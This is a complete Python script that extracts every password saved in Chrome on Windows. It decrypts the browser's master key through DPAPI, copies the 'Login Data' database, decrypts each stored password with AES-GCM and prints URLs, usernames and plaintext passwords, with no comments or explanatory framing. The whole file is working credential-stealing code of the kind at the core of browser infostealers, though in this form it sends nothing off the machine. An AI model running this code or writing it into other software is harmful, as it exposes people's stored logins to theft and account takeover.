import os
import shutil
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    with open(os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'), "r") as f:
        local_state = json.load(f)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # Remove DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]  # Extract the initialization vector
        payload = buff[15:]  # The rest is the payload
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)

        if decrypted_pass:
            # The last 16 bytes are the GCM tag, not part of the actual password
            return decrypted_pass[:-16].decode('utf-8', errors='replace')  # Safely decode
        else:
            print("Decryption returned an empty result.")
            return "Decryption failed"
    except Exception as e:
        print(f"Decryption error: {e}")  # Log the error for debugging
        return "Decryption failed"

def printer(passwords):
    for url, username, password in passwords:
        print(f"URL: {url}\nUser Name: {username}\nPassword: {password}\n")

def main():
    master_key = get_master_key()
    if master_key is None:
        print("Failed to retrieve master key.")
        return

    login_db = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\default\Login Data')
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    passwords = []
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if decrypted_password and len(username) > 0:
                passwords.append((url, username, decrypted_password))
    except Exception as e:
        print(f"Error fetching passwords: {str(e)}")

    printer(passwords)  # Print the results

    cursor.close()
    conn.close()

    try:
        os.remove("Loginvault.db")
    except Exception as e:
        print(f"Error deleting database file: {str(e)}")

if __name__ == "__main__":
    main()
